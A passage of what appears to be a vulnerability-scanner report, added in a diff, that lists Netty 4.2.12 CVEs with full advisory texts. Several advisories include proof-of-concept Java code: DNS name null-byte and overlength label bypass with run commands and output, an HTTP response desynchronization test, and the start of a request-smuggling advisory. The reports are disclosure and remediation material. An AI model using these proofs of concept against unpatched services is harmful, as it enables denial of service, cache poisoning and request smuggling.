+                        │     │                   buf.writeByte(BLOCK_TYPE_COMPRESSED | 0x0F);
+                        │     │                                               buf.writeIntLE(1);
+                        │     │                                               buf.writeIntLE(1 << 25);
+                        │     │                                               buf.writeIntLE(0);
+                        │     │                                               buf.writeByte(0);
+                        │     │                                               ctx.writeAndFlush(buf);
+                        │     │                                               ctx.fireChannelActive();
+                        │     │                               ChannelFuture clientChannel =
+                        │     │                   client.connect(serverChannel.channel().localAddress()).sync()
+                        │     │                   ;
+                        │     │                               assertTrue(latch.await(10, TimeUnit.SECONDS));
+                        │     │                               assertInstanceOf(IndexOutOfBoundsException.class,
+                        │     │                    serverError.get());
+                        │     │                               clientChannel.channel().close();
+                        │     │                               serverChannel.channel().close();
+                        │     │                           } finally {
+                        │     │                               workerGroup.shutdownGracefully();
+                        │     │                           }
+                        │     │                       }
+                        │     │                   ```
+                        │     │                   ### Impact
+                        │     │                   Untrusted senders without per-channel / aggregate limits can
+                        │     │                   stress memory with many small requests. 
+                        │     ├ Severity        : HIGH 
+                        │     ├ VendorSeverity   ─ ghsa: 3 
+                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
+                        │     │                         ╰ V3Score : 7.5 
+                        │     ╰ References       ╭ [0]: https://github.com/netty/netty 
+                        │                        ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA
+                        │                               -mj4r-2hfc-f8p6 
+                        ├ [1] ╭ VulnerabilityID : CVE-2026-42579 
+                        │     ├ VendorIDs        ─ [0]: GHSA-cm33-6792-r9fm 
+                        │     ├ PkgName         : io.netty:netty-codec-dns 
+                        │     ├ PkgPath         : openaf/Kube/netty-codec-dns-4.2.12.Final.jar 
+                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-dns@4.2.12.Final 
+                        │     │                  ╰ UID : d1018bca82fa2aba 
+                        │     ├ InstalledVersion: 4.2.12.Final 
+                        │     ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
+                        │     ├ Status          : fixed 
+                        │     ├ Layer            ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab
+                        │     │                  │         09293113b8395f0ceaa 
+                        │     │                  ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e
+                        │     │                            54ebf30433b93da5788 
+                        │     ├ SeveritySource  : ghsa 
+                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42579 
+                        │     ├ DataSource       ╭ ID  : ghsa 
+                        │     │                  ├ Name: GitHub Security Advisory Maven 
+                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
+                        │     │                          osystem%3Amaven 
+                        │     ├ Fingerprint     : sha256:9820d9e169d06220375e3a48cf4f2421efd076d6de73e8739a8cd1
+                        │     │                   1db94e36a3 
+                        │     ├ Title           : Netty has a DNS Codec Input Validation Bypass (Encoder +
+                        │     │                   Decoder) 
+                        │     ├ Description     : # Security Vulnerability Report: DNS Codec Input Validation
+                        │     │                   Bypass in Netty (Encoder + Decoder)
+                        │     │                   
+                        │     │                   ## 1. Vulnerability Summary
+                        │     │                   | Field | Value |
+                        │     │                   |-------|-------|
+                        │     │                   | **Product** | Netty |
+                        │     │                   | **Version** | 4.2.12.Final (and all prior versions with
+                        │     │                   codec-dns) |
+                        │     │                   | **Component** | `io.netty.handler.codec.dns.DnsCodecUtil`
+                        │     │                   |
+                        │     │                   | **Vulnerability Type** | CWE-20: Improper Input Validation
+                        │     │                   / CWE-626: Null Byte Interaction Error / CWE-400:
+                        │     │                   Uncontrolled Resource Consumption |
+                        │     │                   | **Impact** | DNS Cache Poisoning / Domain Validation Bypass
+                        │     │                    / Denial of Service / Malformed DNS Packets |
+                        │     │                   ## 2. Affected Components
+                        │     │                   Both the encoder and decoder in the same file are affected:
+                        │     │                   - `io.netty.handler.codec.dns.DnsCodecUtil` —
+                        │     │                   `encodeDomainName()` method (lines 31-51):
+                        │     │                     - No null byte validation in domain name labels
+                        │     │                     - No per-label length validation (RFC 1035 max: 63 bytes)
+                        │     │                     - No total domain name length validation (RFC 1035 max: 255
+                        │     │                    bytes)
+                        │     │                     - Empty labels silently truncate the domain name
+                        │     │                   `decodeDomainName()` method (lines 53-118):
+                        │     │                     - No per-label length validation (max 63)
+                        │     │                     - No total domain name length validation (max 255)
+                        │     │                     - Unbounded StringBuilder growth from attacker-controlled
+                        │     │                   DNS responses
+                        │     │                   ## 3. Vulnerability Description
+                        │     │                   Netty's DNS codec does **not enforce RFC 1035 domain name
+                        │     │                   constraints** during either encoding or decoding. This
+                        │     │                   creates a bidirectional attack surface: malicious DNS
+                        │     │                   responses can exploit the decoder, and user-influenced
+                        │     │                   hostnames can exploit the encoder.
+                        │     │                   ### 3.1 Encoder Side — Null Byte Injection (CWE-626)
+                        │     │                   A domain name containing a null byte (e.g.,
+                        │     │                   `"evil\0.example.com"`) is encoded with the null byte
+                        │     │                   embedded in the label data. This creates a domain name that
+                        │     │                   different DNS implementations interpret differently:
+                        │     │                   - **Java (full string)**: sees `"evil\0.example.com"` as a
+                        │     │                   single label containing a null
+                        │     │                   - **C/native DNS libraries**: truncate at the null byte,
+                        │     │                   seeing only `"evil"`
+                        │     │                   - **DNS servers**: may accept or reject based on
+                        │     │                   implementation
+                        │     │                   This differential interpretation enables **DNS cache
+                        │     │                   poisoning** and **domain validation bypass**.
+                        │     │                   ### 3.2 Encoder Side — Overlength Label (RFC 1035 Violation)
+                        │     │                   Labels exceeding 63 bytes are accepted by the encoder. The
+                        │     │                   length byte is written as a single unsigned byte, so a
+                        │     │                   200-byte label writes `0xC8` (200) as the length. Per RFC
+                        │     │                   1035, values 192-255 indicate **compression pointers**. This
+                        │     │                   means:
+                        │     │                   - A 200-byte label length `0xC8` would be interpreted as a
+                        │     │                   **compression pointer** by standards-compliant DNS parsers
+                        │     │                   - This creates **parser confusion** between label and pointer
+                        │     │                    interpretation
+                        │     │                   ### 3.3 Encoder Side — Silent Truncation via Empty Labels
+                        │     │                   ```java
+                        │     │                   encodeDomainName("a..b.com", buf);
+                        │     │                   // Encodes as: [01] 'a' [00]
+                        │     │                   // Only "a." is encoded, ".b.com" is silently dropped!
+                        │     │                   ```
+                        │     │                   An attacker can craft input like `"safe-domain..evil.com"`
+                        │     │                   which gets truncated to just `"safe-domain."`, potentially
+                        │     │                   bypassing domain allowlists.
+                        │     │                   ### 3.4 Decoder Side — Unbounded Memory Allocation
+                        │     │                   The decoder accepts labels of any length (0-255 bytes)
+                        │     │                   without checking the RFC 1035 per-label limit of 63 bytes or
+                        │     │                   the total domain name limit of 255 bytes. A malicious DNS
+                        │     │                   server can return responses with oversized labels, causing
+                        │     │                   excessive memory allocation.
+                        │     │                   ### Root Cause — Encoder
+                        │     │                   // DnsCodecUtil.java:31-51
+                        │     │                   static void encodeDomainName(String name, ByteBuf buf) {
+                        │     │                       if (ROOT.equals(name)) {
+                        │     │                           buf.writeByte(0);
+                        │     │                           return;
+                        │     │                       }
+                        │     │                       final String[] labels = name.split("\\.");
+                        │     │                       for (String label : labels) {
+                        │     │                           final int labelLen = label.length();
+                        │     │                           if (labelLen == 0) {
+                        │     │                               break;  // NO ERROR - silently truncates!
+                        │     │                           }
+                        │     │                           // NO check: labelLen > 63
+                        │     │                           // NO check: label contains null bytes
+                        │     │                           // NO check: total name > 255 bytes
+                        │     │                           buf.writeByte(labelLen);                    // Can
+                        │     │                   write values > 63!
+                        │     │                           ByteBufUtil.writeAscii(buf, label);         // Null
+                        │     │                   bytes pass through!
+                        │     │                       buf.writeByte(0);
+                        │     │                   }
+                        │     │                   ### Root Cause — Decoder
+                        │     │                   // DnsCodecUtil.java:94-99 (decodeDomainName)
+                        │     │                   } else if (len != 0) {
+                        │     │                       if (!in.isReadable(len)) {  // Only checks if bytes
+                        │     │                   EXIST, not if len <= 63
+                        │     │                           throw new CorruptedFrameException("truncated label in
+                        │     │                    a name");
+                        │     │                       name.append(in.toString(in.readerIndex(), len,
+                        │     │                   CharsetUtil.UTF_8)).append('.');
+                        │     │                       //    ^^^^^^ StringBuilder grows WITHOUT any length
+                        │     │                   limit
+                        │     │                       in.skipBytes(len);
+                        │     │                   **Missing checks in decoder**:
+                        │     │                   - No `if (len > 63)` check per RFC 1035 Section 2.3.4
+                        │     │                   - No `if (name.length() > 255)` check for total domain name
+                        │     │                   length
+                        │     │                   ## 4. Exploitability Prerequisites
+                        │     │                   ### Encoder Side (outbound)
+                        │     │                   1. An application constructs DNS queries using Netty's DNS
+                        │     │                   codec with user-influenced domain names
+                        │     │                   2. The constructed DNS packets are sent to DNS servers or
+                        │     │                   resolvers
+                        │     │                   ### Decoder Side (inbound)
+                        │     │                   1. An application uses Netty's `codec-dns` or `resolver-dns`
+                        │     │                   module to process DNS responses
+                        │     │                   2. The application communicates with a malicious or
+                        │     │                   compromised DNS server
+                        │     │                   **Attack surface**: Any Netty application using DNS
+                        │     │                   resolution (`DnsNameResolver`) is potentially affected on the
+                        │     │                    decoder side, as DNS responses from the network are
+                        │     │                   attacker-controlled. The encoder side requires
+                        │     │                   user-controlled hostnames.
+                        │     │                   ## 5. Attack Scenarios
+                        │     │                   ### Scenario 1: DNS Cache Poisoning via Null Byte (Encoder)
+                        │     │                   String hostname = userInput;  // "evil\0.trusted.com"
+                        │     │                   DnsQuery query = new DefaultDnsQuery(...)
+                        │     │                       .addRecord(DnsSection.QUESTION,
+                        │     │                           new DefaultDnsQuestion(hostname, DnsRecordType.A));
+                        │     │                   The DNS query for `"evil\0.trusted.com"` may be interpreted
+                        │     │                   by some resolvers as a query for `"evil"` (truncated at
+                        │     │                   null). If the attacker controls the DNS for `"evil"`, they
+                        │     │                   can return a response that gets cached for
+                        │     │                   `"evil\0.trusted.com"` (or vice versa), poisoning the cache.
+                        │     │                   ### Scenario 2: Label/Pointer Confusion (Encoder)
+                        │     │                   A 200-byte label writes length byte `0xC8`.
+                        │     │                   Standards-compliant parsers interpret `0xC0-0xFF` as
+                        │     │                   **compression pointer** prefixes (RFC 1035 Section 4.1.4).
+                        │     │                   The resulting DNS packet is structurally ambiguous:
+                        │     │                   Byte:  [C8] [61 61 61 ... (200 bytes)]
+                        │     │                            ↑
+                        │     │                      Label interpretation: 200-byte label starting with 'a'
+                        │     │                      Pointer interpretation: pointer to offset 0x0861 = 2145
+                        │     │                   ### Scenario 3: Memory Exhaustion via Large Labels (Decoder)
+                        │     │                   A malicious DNS server returns a response with a 255-byte
+                        │     │                   label (RFC limit: 63). Netty decodes it without error,
+                        │     │                   creating a 260+ character String. With compression pointers,
+                        │     │                   a small DNS response can cause megabytes of StringBuilder
+                        │     │                   allocation.
+                        │     │                   ### Scenario 4: Domain Truncation via Empty Label (Encoder)
+                        │     │                   encodeDomainName("safe-domain..evil.com", buf);
+                        │     │                   // Only "safe-domain." is encoded, "evil.com" silently
+                        │     │                   dropped
+                        │     │                   This can bypass domain allowlists that check the input
+                        │     │                   string.
+                        │     │                   ### Scenario 5: Downstream Processing Failures (Decoder)
+                        │     │                   Applications that pass decoded domain names to other DNS
+                        │     │                   libraries, certificate validators, or URL parsers may crash
+                        │     │                   or behave incorrectly when receiving names > 255 bytes, as
+                        │     │                   these systems typically assume RFC 1035 compliance.
+                        │     │                   ## 6. Proof of Concept
+                        │     │                   ### PoC 1: Encoder Null Byte and Overlength
+                        │     │                   (DnsEncoderNullBytePoC.java)
+                        │     │                   import io.netty.buffer.ByteBuf;
+                        │     │                   import io.netty.buffer.Unpooled;
+                        │     │                   import java.lang.reflect.Method;
+                        │     │                   import java.nio.charset.StandardCharsets;
+                        │     │                   public class DnsEncoderNullBytePoC {
+                        │     │                       public static void main(String[] args) throws Exception
+                        │     │                   {
+                        │     │                           System.out.println("=== Netty DNS Encoder Validation
+                        │     │                   Bypass PoC ===\n");
+                        │     │                           Class<?> clazz =
+                        │     │                   Class.forName("io.netty.handler.codec.dns.DnsCodecUtil");
+                        │     │                           Method encode =
+                        │     │                   clazz.getDeclaredMethod("encodeDomainName",
+                        │     │                               String.class, ByteBuf.class);
+                        │     │                           encode.setAccessible(true);
+                        │     │                           // Test 1: Null byte in domain name
+                        │     │                           ByteBuf buf = Unpooled.buffer(256);
+                        │     │                           encode.invoke(null, "evil\0.example.com", buf);
+                        │     │                           byte[] bytes = new byte[buf.readableBytes()];
+                        │     │                           buf.readBytes(bytes);
+                        │     │                           buf.release();
+                        │     │                           System.out.print("[TEST 1] Null byte - Encoded: ");
+                        │     │                           for (byte b : bytes) System.out.printf("%02x ", b &
+                        │     │                   0xff);
+                        │     │                           System.out.println("\nVULNERABLE: Null byte 0x00 in
+                        │     │                   label data!");
+                        │     │                           // Test 2: 200-byte label
+                        │     │                           ByteBuf buf2 = Unpooled.buffer(512);
+                        │     │                           encode.invoke(null, "a".repeat(200) + ".com", buf2);
+                        │     │                           System.out.println("\n[TEST 2] 200-byte label
+                        │     │                   encoded: " + buf2.readableBytes() + " bytes");
+                        │     │                           System.out.println("VULNERABLE: Overlength label
+                        │     │                   accepted!");
+                        │     │                           buf2.release();
+                        │     │                           // Test 3: Empty label truncation
+                        │     │                           ByteBuf buf3 = Unpooled.buffer(256);
+                        │     │                           encode.invoke(null, "a..b.com", buf3);
+                        │     │                           byte[] bytes3 = new byte[buf3.readableBytes()];
+                        │     │                           buf3.readBytes(bytes3);
+                        │     │                           buf3.release();
+                        │     │                           System.out.print("\n[TEST 3] Empty label - Encoded:
+                        │     │                   ");
+                        │     │                           for (byte b : bytes3) System.out.printf("%02x ", b &
+                        │     │                           System.out.println("\nVULNERABLE: Domain silently
+                        │     │                   truncated!");
+                        │     │                   ### PoC 2: Decoder Length Bypass (DnsDecoderLengthPoC.java)
+                        │     │                   public class DnsDecoderLengthPoC {
+                        │     │                           System.out.println("=== Netty DNS Decoder Length
+                        │     │                           Method decode =
+                        │     │                   clazz.getDeclaredMethod("decodeDomainName", ByteBuf.class);
+                        │     │                           decode.setAccessible(true);
+                        │     │                           // Test 1: 100-byte label (RFC limit: 63)
+                        │     │                           ByteBuf buf1 = Unpooled.buffer(256);
+                        │     │                           buf1.writeByte(100);
+                        │     │                          
+                        │     │                   buf1.writeBytes("a".repeat(100).getBytes(StandardCharsets.US_
+                        │     │                   ASCII));
+                        │     │                           buf1.writeByte(3);
+                        │     │                   buf1.writeBytes("com".getBytes(StandardCharsets.US_ASCII));
+                        │     │                           buf1.writeByte(0);
+                        │     │                           String r1 = (String) decode.invoke(null, buf1);
+                        │     │                           buf1.release();
+                        │     │                           System.out.println("[TEST 1] 100-byte label: length="
+                        │     │                    + r1.length() +
+                        │     │                               " VULNERABLE=" + (r1.length() > 64));
+                        │     │                           // Test 2: 5 x 60-byte labels = 305 bytes (RFC limit:
+                        │     │                    255)
+                        │     │                           for (int i = 0; i < 5; i++) {
+                        │     │                               buf2.writeByte(60);
+                        │     │                              
+                        │     │                   buf2.writeBytes(String.valueOf((char)('a'+i)).repeat(60)
+                        │     │                                   .getBytes(StandardCharsets.US_ASCII));
+                        │     │                           buf2.writeByte(0);
+                        │     │                           String r2 = (String) decode.invoke(null, buf2);
+                        │     │                           System.out.println("[TEST 2] 305-byte domain:
+                        │     │                   length=" + r2.length() +
+                        │     │                               " VULNERABLE=" + (r2.length() > 255));
+                        │     │                   ### How to Compile and Run
+                        │     │                   ```bash
+                        │     │                   JARS=$(find ~/.m2/repository/io/netty -name "netty-*.jar"
+                        │     │                   -path "*/4.2.12.Final/*" \
+                        │     │                     | grep -v sources | grep -v javadoc | tr '\n' ':')
+                        │     │                   # Encoder PoC
+                        │     │                   javac -cp "$JARS" DnsEncoderNullBytePoC.java
+                        │     │                   java --add-opens java.base/java.lang=ALL-UNNAMED -cp
+                        │     │                   "$JARS:." DnsEncoderNullBytePoC
+                        │     │                   # Decoder PoC
+                        │     │                   javac -cp "$JARS" DnsDecoderLengthPoC.java
+                        │     │                   "$JARS:." DnsDecoderLengthPoC
+                        │     │                   ### PoC Execution Output (Verified on Netty 4.2.12.Final)
+                        │     │                   **Encoder PoC:**
+                        │     │                   === Netty DNS Encoder Validation Bypass PoC ===
+                        │     │                   [TEST 1] Null byte in domain name
+                        │     │                     Input: "evil\0.example.com"
+                        │     │                     Encoded bytes: 05 65 76 69 6c 00 07 65 78 61 6d 70 6c 65 03
+                        │     │                    63 6f 6d 00
+                        │     │                     Null byte in label data: true
+                        │     │                     VULNERABLE: YES - Null byte accepted!
+                        │     │                   [TEST 2] Label > 63 bytes in encoder
+                        │     │                     Input: "aaaaaa..." (200-char label)
+                        │     │                     Encoded bytes: 206
+                        │     │                     VULNERABLE: YES - Overlength label accepted in encoder!
+                        │     │                   [TEST 3] Empty labels (consecutive dots)
+                        │     │                     Input: "a..b.com"
+                        │     │                     Encoded bytes: 01 61 00
+                        │     │                     Note: Empty label truncates the name (may lose data)
+                        │     │                   **Decoder PoC:**
+                        │     │                   === Netty DNS Decoder Length Bypass PoC ===
+                        │     │                   [TEST 1] Label > 63 bytes (RFC 1035 violation)
+                        │     │                     Label length: 100 bytes (RFC limit: 63)
+                        │     │                     Decoded name length: 105
+                        │     │                     VULNERABLE: YES - Label > 63 bytes accepted!
+                        │     │                   [TEST 2] Domain > 255 bytes via multiple labels
+                        │     │                     5 labels x 60 bytes = 300+ bytes total
+                        │     │                     RFC 1035 limit: 255 bytes
+                        │     │                     Decoded name length: 305
+                        │     │                     VULNERABLE: YES - Domain > 255 bytes accepted!
+                        │     │                   ## 7. Impact Analysis
+                        │     │                   | Impact Category | Description |
+                        │     │                   |----------------|-------------|
+                        │     │                   | **Integrity** | HIGH — Null byte injection causes
+                        │     │                   differential interpretation across DNS implementations |
+                        │     │                   | **Availability** | HIGH — Malicious DNS responses can cause
+                        │     │                    unbounded memory allocation via decoder |
+                        │     │                   | **DNS Cache Poisoning** | Different parsers see different
+                        │     │                   domain names from the same encoded packet |
+                        │     │                   | **Domain Validation Bypass** | Null bytes can bypass
+                        │     │                   allowlist/blocklist checks in DNS proxies |
+                        │     │                   | **Label/Pointer Confusion** | Length bytes > 63 conflict
+                        │     │                   with RFC 1035 compression pointer encoding |
+                        │     │                   | **Silent Truncation** | Empty labels silently drop the
+                        │     │                   remainder of the domain name |
+                        │     │                   | **Downstream Failures** | Oversized domain names may crash
+                        │     │                   certificate validators, URL parsers, or other DNS-aware
+                        │     │                   libraries |
+                        │     │                   ## 8. Remediation Recommendations
+                        │     │                   ### Fix for Encoder (encodeDomainName)
+                        │     │                       int totalLength = 0;
+                        │     │                               throw new IllegalArgumentException("DNS name
+                        │     │                   contains empty label: " + name);
+                        │     │                           if (labelLen > 63) {
+                        │     │                               throw new IllegalArgumentException(
+                        │     │                                   "DNS label length " + labelLen + " exceeds
+                        │     │                   maximum of 63: " + name);
+                        │     │                           for (int i = 0; i < label.length(); i++) {
+                        │     │                               if (label.charAt(i) == '\0') {
+                        │     │                                   throw new IllegalArgumentException(
+                        │     │                                       "DNS label contains null byte at index "
+                        │     │                   + i);
+                        │     │                               }
+                        │     │                           totalLength += 1 + labelLen;
+                        │     │                           if (totalLength > 254) {
+                        │     │                                   "DNS name exceeds maximum length of 255: " +
+                        │     │                   name);
+                        │     │                           buf.writeByte(labelLen);
+                        │     │                           ByteBufUtil.writeAscii(buf, label);
+                        │     │                   ### Fix for Decoder (decodeDomainName)
+                        │     │                   // Add after "} else if (len != 0) {":
+                        │     │                   if (len > 63) {
+                        │     │                       throw new CorruptedFrameException("DNS label length " +
+                        │     │                   len + " exceeds maximum of 63");
+                        │     │                   // Add after "name.append(...)":
+                        │     │                   if (name.length() > 255) {
+                        │     │                       throw new CorruptedFrameException("DNS domain name length
+                        │     │                    exceeds maximum of 255");
+                        │     │                   ## 9. Resources
+                        │     │                   - [RFC 1035 Section 2.3.4: Size
+                        │     │                   Limits](https://tools.ietf.org/html/rfc1035#section-2.3.4)
+                        │     │                   - [RFC 1035 Section 4.1.4: Message
+                        │     │                   Compression](https://tools.ietf.org/html/rfc1035#section-4.1.
+                        │     │                   4)
+                        │     │                   - [CWE-20: Improper Input
+                        │     │                   Validation](https://cwe.mitre.org/data/definitions/20.html)
+                        │     │                   - [CWE-400: Uncontrolled Resource
+                        │     │                   Consumption](https://cwe.mitre.org/data/definitions/400.html)
+                        │     │                   - [CWE-626: Null Byte Interaction
+                        │     │                   Error](https://cwe.mitre.org/data/definitions/626.html) 
+                        │     ├ Severity        : HIGH 
+                        │     ├ VendorSeverity   ─ ghsa: 3 
+                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N 
+                        │     │                         ╰ V3Score : 7.5 
+                        │     ╰ References       ╭ [0]: https://github.com/netty/netty 
+                        │                        ├ [1]: https://github.com/netty/netty/security/advisories/GHSA
+                        │                        │      -cm33-6792-r9fm 
+                        │                        ├ [2]: https://tools.ietf.org/html/rfc1035#section-2.3.4 
+                        │                        ╰ [3]: https://tools.ietf.org/html/rfc1035#section-4.1.4 
+                        ├ [2] ╭ VulnerabilityID : CVE-2026-42584 
+                        │     ├ VendorIDs        ─ [0]: GHSA-57rv-r2g8-2cj3 
+                        │     ├ PkgName         : io.netty:netty-codec-http 
+                        │     ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
+                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
+                        │     │                  ╰ UID : 42139b2b89dda2f4 
+                        │     ├ InstalledVersion: 4.2.12.Final 
+                        │     ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
+                        │     ├ Status          : fixed 
+                        │     ├ Layer            ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab
+                        │     │                  │         09293113b8395f0ceaa 
+                        │     │                  ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e
+                        │     │                            54ebf30433b93da5788 
+                        │     ├ SeveritySource  : ghsa 
+                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42584 
+                        │     ├ DataSource       ╭ ID  : ghsa 
+                        │     │                  ├ Name: GitHub Security Advisory Maven 
+                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
+                        │     │                          osystem%3Amaven 
+                        │     ├ Fingerprint     : sha256:c44c1e009025267d12dc386771cac0d2f90557b993df7e3133634e
+                        │     │                   ad794f181b 
+                        │     ├ Title           : Netty has HttpClientCodec response desynchronization 
+                        │     ├ Description     : ### Summary
+                        │     │                    If HttpClientCodec is configured, there are use cases when a
+                        │     │                    response body from one request, can be parsed as another's.
+                        │     │                   
+                        │     │                   ### Details
+                        │     │                   HttpClientCodec pairs each inbound response with an outbound
+                        │     │                   request by `queue.poll()` once per response, including for
+                        │     │                   `1xx`. If the client pipelines GET then HEAD and the server
+                        │     │                   sends 103, then 200 with GET body, then 200 for HEAD, the
+                        │     │                   queue pairs HEAD with the first 200. The HEAD rule then skips
+                        │     │                    reading that message’s body, so the GET entity bytes stay on
+                        │     │                    the stream and the following 200 is parsed from the wrong
+                        │     │                   offset.
+                        │     │                   Prerequisites 
+                        │     │                   - HTTP/1.1 pipelining
+                        │     │                   - HEAD in the pipeline
+                        │     │                   - The server sends 1xx
+                        │     │                   ### PoC
+                        │     │                   ```java
+                        │     │                       @Test
+                        │     │                       public void test() {
+                        │     │                           EmbeddedChannel channel = new EmbeddedChannel(new
+                        │     │                   HttpClientCodec());
+                        │     │                           assertTrue(channel.writeOutbound(new
+                        │     │                   DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET,
+                        │     │                   "/1")));
+                        │     │                           ByteBuf request = channel.readOutbound();
+                        │     │                           request.release();
+                        │     │                           assertNull(channel.readOutbound());
+                        │     │                   DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.HEAD,
+                        │     │                    "/2")));
+                        │     │                           request = channel.readOutbound();
+                        │     │                           String responseStr = "HTTP/1.1 103 Early
+                        │     │                   Hints\r\n\r\n" +
+                        │     │                                   "HTTP/1.1 200 OK\r\nContent-Length:
+                        │     │                   5\r\n\r\nhello" +
+                        │     │                                   "HTTP/1.1 200 OK\r\n\r\n";
+                        │     │                          
+                        │     │                   assertTrue(channel.writeInbound(Unpooled.copiedBuffer(respons
+                        │     │                   eStr, CharsetUtil.US_ASCII)));
+                        │     │                           // Response 1
+                        │     │                           HttpResponse response = channel.readInbound();
+                        │     │                           assertEquals(HttpResponseStatus.EARLY_HINTS,
+                        │     │                   response.status());
+                        │     │                           LastHttpContent last = channel.readInbound();
+                        │     │                           assertEquals(0, last.content().readableBytes());
+                        │     │                           last.release();
+                        │     │                           // Response 2
+                        │     │                           response = channel.readInbound();
+                        │     │                           assertEquals(HttpResponseStatus.OK,
+                        │     │                           last = channel.readInbound();
+                        │     │                           // Response 3
+                        │     │                           FullHttpResponse response1 = channel.readInbound();
+                        │     │                           assertTrue(response1.decoderResult().isFailure());
+                        │     │                           assertEquals(0,
+                        │     │                   response1.content().readableBytes());
+                        │     │                           response1.release();
+                        │     │                           assertFalse(channel.finish());
+                        │     │                       }
+                        │     │                   ```
+                        │     │                   ### Impact
+                        │     │                   Integrity/availability of HTTP parsing on that connection,
+                        │     │                   unsafe reuse of the socket. 
+                        │     ├ Severity        : HIGH 
+                        │     ├ VendorSeverity   ─ ghsa: 3 
+                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L 
+                        │     │                         ╰ V3Score : 7.3 
+                        │     ╰ References       ╭ [0]: https://github.com/netty/netty 
+                        │                        ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA
+                        │                               -57rv-r2g8-2cj3 
+                        ├ [3] ╭ VulnerabilityID : CVE-2026-41417 
+                        │     ├ VendorIDs        ─ [0]: GHSA-v8h7-rr48-vmmv 
+                        │     ├ PkgName         : io.netty:netty-codec-http 
+                        │     ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
+                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
+                        │     │                  ╰ UID : 42139b2b89dda2f4 
+                        │     ├ InstalledVersion: 4.2.12.Final 
+                        │     ├ FixedVersion    : 4.1.133.Final, 4.2.13.Final 
+                        │     ├ Status          : fixed 
+                        │     ├ Layer            ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab
+                        │     │                  │         09293113b8395f0ceaa 
+                        │     │                  ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e
+                        │     │                            54ebf30433b93da5788 
+                        │     ├ SeveritySource  : ghsa 
+                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41417 
+                        │     ├ DataSource       ╭ ID  : ghsa 
+                        │     │                  ├ Name: GitHub Security Advisory Maven 
+                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
+                        │     │                          osystem%3Amaven 
+                        │     ├ Fingerprint     : sha256:29de78fc2a2d319e7a52919b3deda180a0999daef098bbf6b3a098
+                        │     │                   38d3ffde14 
+                        │     ├ Title           : Netty: Start-Line Injection in DefaultHttpRequest.setUri()
+                        │     │                   Allows HTTP Request Smuggling and RTSP Request Injection 
+                        │     ├ Description     : ### Summary
+                        │     │                   Netty allows request-line validation to be bypassed when a
+                        │     │                   `DefaultHttpRequest` or `DefaultFullHttpRequest` is created
+                        │     │                   first and its URI is later changed via `setUri()`.
+                        │     │                   
+                        │     │                   The constructors reject CRLF and whitespace characters that
+                        │     │                   would break the start-line, but `setUri()` does not apply the
+                        │     │                    same validation. `HttpRequestEncoder` and `RtspEncoder` then
+                        │     │                    write the URI into the request line verbatim. If
+                        │     │                   attacker-controlled input reaches `setUri()`, this enables
+                        │     │                   CRLF injection and insertion of additional HTTP or RTSP
+                        │     │                   requests.
+                        │     │                   In practice, this leads to HTTP request smuggling /
+                        │     │                   desynchronization on the HTTP side and request injection on
+                        │     │                   the RTSP side.
+                        │     │                   ### Details
+                        │     │                   The root issue is that URI validation exists only on the
+                        │     │                   constructor path, but not on the public setter path.
+                        │     │                   - `io.netty.handler.codec.http.DefaultHttpRequest`
+                        │     │                     - The constructor calls
+                        │     │                   `HttpUtil.validateRequestLineTokens(method, uri)`
+                        │     │                     - `setUri(String uri)` only performs `checkNotNull` and
+                        │     │                   does not validate
+                        │     │                   - `io.netty.handler.codec.http.DefaultFullHttpRequest`
+                        │     │                     - `setUri(String uri)` delegates to the parent
+                        │     │                   implementation
+                        │     │                   - `io.netty.handler.codec.http.HttpRequestEncoder`
+                        │     │                     - Writes `request.uri()` directly into the request line
+                        │     │                   - `io.netty.handler.codec.rtsp.RtspEncoder`
+                        │     │                   This creates the following bypass:
+                        │     │                   1. An application creates a `DefaultHttpRequest` or
+                        │     │                   `DefaultFullHttpRequest` with a safe URI
+                        │     │                   2. Later, attacker-influenced input is passed into
+                        │     │                   `setUri()`
+                        │     │                   3. `HttpRequestEncoder` or `RtspEncoder` encodes that value
+                        │     │                   verbatim
+                        │     │                   4. The downstream server, proxy, or RTSP peer interprets the
+                        │     │                   injected bytes after CRLF as separate requests
+                        │     │                   This appears to be an incomplete fix pattern where start-line
+                        │     │                    validation exists, but can still be bypassed through a
+                        │     │                   mutable public API.
+                        │     │                   ### PoC (HTTP)
+                        │     │                   The following code first creates a normal request object and
+                        │     │                   then injects a malicious request line using `setUri()`.
+                        │     │                   ```java
+                        │     │                   import io.netty.buffer.ByteBuf;
+                        │     │                   import io.netty.channel.embedded.EmbeddedChannel;
+                        │     │                   import io.netty.handler.codec.http.DefaultHttpRequest;
